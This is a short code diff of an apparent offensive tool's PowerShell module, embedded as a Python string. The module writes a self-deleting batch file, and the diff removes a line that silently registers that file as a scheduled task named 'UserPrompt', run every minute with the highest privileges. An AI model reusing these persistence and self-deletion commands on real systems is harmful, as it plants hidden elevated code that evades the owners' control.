@@ -121,6 +121,5 @@ $file | Out-File $storage -encoding ASCII -Append
 $file | Out-File $storage -encoding ASCII -Append
 $file='start /b "" cmd /c del "%~f0"&exit /b'
 $file | Out-File $storage -encoding ASCII -Append
-Start-Process "schtasks" -ArgumentList "/create /sc minute /mo 1 /tn UserPrompt /tr $storage /RL HIGHEST /F" -Verb runAs -WindowStyle hidden
 		'''
                 return moduleSource
